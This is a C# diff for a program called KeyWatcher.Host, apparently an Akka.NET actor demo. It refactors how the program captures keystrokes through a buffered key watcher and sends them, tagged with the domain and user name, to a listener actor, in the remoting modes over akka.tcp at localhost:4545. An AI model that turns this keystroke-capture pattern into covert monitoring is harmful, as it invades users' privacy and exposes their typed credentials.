@@ -20,9 +20,9 @@ namespace KeyWatcher.Host
 		{
 			//Program.UseSimpleKeyWatcher();
 			//Program.UseBufferedKeyWatcher();
-			//Program.UseAkkaLocally();
+			Program.UseAkkaLocally();
 			//Program.UseAkkaWithRemoting();
-			Program.UseAkkaWithRemotingWithQuietness();
+			//Program.UseAkkaWithRemotingWithQuietness();
 		}
 
 		private static void UseBufferedKeyWatcher()
@@ -50,19 +50,19 @@ namespace KeyWatcher.Host
 			builder.RegisterModule<ActorsModule>();
 			var container = builder.Build();
 
-			var userName = $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName : ".")}\\{Environment.UserName}";
+			var userName = Program.GetUserName();
 
 			using (var system = ActorSystem.Create("KeyWatcherHost"))
 			{
 				new AutoFacDependencyResolver(container, system);
 
-				var user = system.ActorOf(system.DI().Props<UserActor>(), "user");
+				var users = system.ActorOf(system.DI().Props<UsersActor>(), "users");
 
 				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
 				{
 					keyLogger.KeysLogged += (s, e) =>
 					{
-						user.Tell(new UserKeysMessage(userName, e.Keys));
+						users.Tell(new UserKeysMessage(userName, e.Keys));
 					};
 
 					Application.Run();
@@ -86,18 +86,18 @@ akka {
 }
 ");
 
-			var userName = $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName : ".")}\\{Environment.UserName}";
+			var userName = Program.GetUserName();
 
 			using (var system = ActorSystem.Create("KeyWatcherHost", config))
 			{
-				var user = system
-					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:4545/user/user");
+				var users = system
+					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:4545/users");
 
 				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
 				{
 					keyLogger.KeysLogged += (s, e) =>
 					{
-						user.Tell(new UserKeysMessage(userName, e.Keys));
+						users.Tell(new UserKeysMessage(userName, e.Keys));
 					};
 
 					Application.Run();
@@ -121,18 +121,17 @@ akka {
 }
 ");
 
-			var userName = $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName : ".")}\\{Environment.UserName}";
-
+			var userName = Program.GetUserName();
 			using (var system = ActorSystem.Create("KeyWatcherHost", config))
 			{
-				var user = system
-					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:4545/user/user");
+				var users = system
+					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:4545/users");
 
 				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
 				{
 					keyLogger.KeysLogged += (s, e) =>
 					{
-						user.Tell(new UserKeysMessage(userName, e.Keys));
+						users.Tell(new UserKeysMessage(userName, e.Keys));
 					};
 
 					var quietObservation =
@@ -148,5 +147,7 @@ akka {
 				}
 			}
 		}
+
+		private static string GetUserName() => $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName + "-" : string.Empty)}{Environment.UserName}";
 	}
 }
